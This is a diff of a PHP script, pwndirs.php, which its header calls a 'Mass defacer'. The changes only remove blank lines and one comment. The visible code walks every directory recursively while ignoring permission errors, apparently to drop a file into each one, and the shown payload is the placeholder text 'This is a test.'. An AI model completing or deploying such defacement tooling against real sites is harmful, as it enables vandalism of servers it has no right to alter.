@@ -3,12 +3,10 @@
 # pwndirs.php - Mass defacer. What?
 # VVestron Phoronix
 
-
 # Defines
 ##
 
 define('DS','/');
-
 
 # Variables
 ##
@@ -18,7 +16,6 @@ $dir = current_dir();
 $paths = array($dir);
 $pwn_name = 'test.txt';
 $pwn_content = 'This is a test.';
-
 
 # Functions
 ##
@@ -46,7 +43,6 @@ function current_dir() {
     return realpath($cur_dir);
 }
 
-
 # Main
 ##
 
@@ -67,7 +63,7 @@ if ($old_php) {
     $iterator = new RecursiveIteratorIterator(
         new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS),
         RecursiveIteratorIterator::SELF_FIRST,
-        RecursiveIteratorIterator::CATCH_GET_CHILD // Ignore "Permission denied"
+        RecursiveIteratorIterator::CATCH_GET_CHILD
     );
 
     foreach ($iterator as $path => $file) {
